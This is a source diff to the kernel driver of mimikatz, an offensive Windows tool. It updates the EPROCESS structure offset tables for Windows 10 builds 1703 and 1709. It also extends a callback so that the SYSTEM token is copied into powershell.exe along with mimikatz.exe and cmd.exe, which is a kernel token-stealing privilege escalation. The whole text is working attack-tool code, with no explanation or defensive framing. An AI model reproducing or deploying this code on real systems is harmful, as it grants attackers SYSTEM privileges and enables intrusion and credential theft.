@@ -18,7 +18,8 @@ const ULONG EPROCESS_OffSetTable[KiwiOsIndex_MAX][Eprocess_MAX] =
 /* 10_1507*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
 /* 10_1511*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
 /* 10_1607*/{0x00b8, 0x00c0, 0x0040, 0x02e4},
-/* 10_1707*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
+/* 10_1703*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
+/* 10_1709*/{0x00b8, 0x00c0, 0x0040, 0x02ec}, //
 #else
 /* UNK	*/	{0},
 /* XP	*/	{0},
@@ -30,7 +31,8 @@ const ULONG EPROCESS_OffSetTable[KiwiOsIndex_MAX][Eprocess_MAX] =
 /* 10_1507*/{0x02f0, 0x0300, 0x0040, 0x06a8},
 /* 10_1511*/{0x02f0, 0x0300, 0x0040, 0x06b0},
 /* 10_1607*/{0x02f0, 0x0300, 0x0040, 0x06c0},
-/* 10_1707*/{0x02e8, 0x0300, 0x0040, 0x06c8},
+/* 10_1703*/{0x02e8, 0x0300, 0x0040, 0x06c8},
+/* 10_1709*/{0x02e8, 0x0300, 0x0040, 0x06c8},
 #endif
 };
 
@@ -179,7 +181,7 @@ NTSTATUS kkll_m_process_systoken_callback(SIZE_T szBufferIn, PVOID bufferIn, PKI
 	NTSTATUS status = STATUS_SUCCESS;
 	PCHAR processName = PsGetProcessImageFileName(pProcess);
 
-	if((RtlCompareMemory("mimikatz.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7))
+	if((RtlCompareMemory("mimikatz.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7) || (RtlCompareMemory("powershell.exe", processName, 14) == 14))
 		status = kkll_m_process_token_toProcess(szBufferIn, bufferIn, outBuffer, (HANDLE) pvArg, pProcess);
 
 	return status;
